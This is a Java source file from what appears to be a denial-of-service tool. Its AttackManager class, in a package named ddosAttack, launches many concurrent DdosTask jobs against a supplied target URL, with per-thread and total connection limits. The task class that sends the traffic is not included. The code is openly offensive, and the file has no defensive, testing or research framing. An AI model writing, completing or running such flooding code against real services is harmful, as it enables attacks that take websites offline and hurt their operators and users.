package ddosAttack;

import java.util.concurrent.ExecutorService;

public class AttackManager {

    private final ExecutorService executor;

    private final String targetUrl;

    private final int maxConnectionsPerThread;

    private final int maxConnectionsTotal;

    public AttackManager(ExecutorService executor, String targetUrl, int maxConnectionsPerThread, int maxConnectionsTotal) {
        this.executor = executor;
        this.targetUrl = targetUrl;
        this.maxConnectionsPerThread = maxConnectionsPerThread;
        this.maxConnectionsTotal = maxConnectionsTotal;
    }

    public void startAttack() throws Exception {
        for (int i = 0; i < maxConnectionsTotal; i++) {
            executor.execute(new DdosTask(targetUrl, maxConnectionsPerThread));
        }
    }
}
